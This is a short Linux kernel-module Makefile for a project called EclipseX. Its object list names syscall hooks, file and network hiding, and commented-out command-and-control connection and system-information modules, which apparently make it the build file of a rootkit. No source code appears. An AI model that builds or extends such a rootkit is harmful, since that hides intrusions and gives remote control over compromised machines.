obj-m += EclipseX.o

EclipseX-objs := EclipseX_main.o \
	hooks.o \
	hide/filters.o \
	hide/files.o \
	hide/network.o 


# 	c2/connection.o \
	c2/commands/system_info/system_info.o

PWD := $(CURDIR)

all:
	make	-C	/lib/modules/$(shell	uname	-r)/build	M=$(PWD)	modules
 
clean:
	make	-C	/lib/modules/$(shell	uname	-r)/build	M=$(PWD)	clean

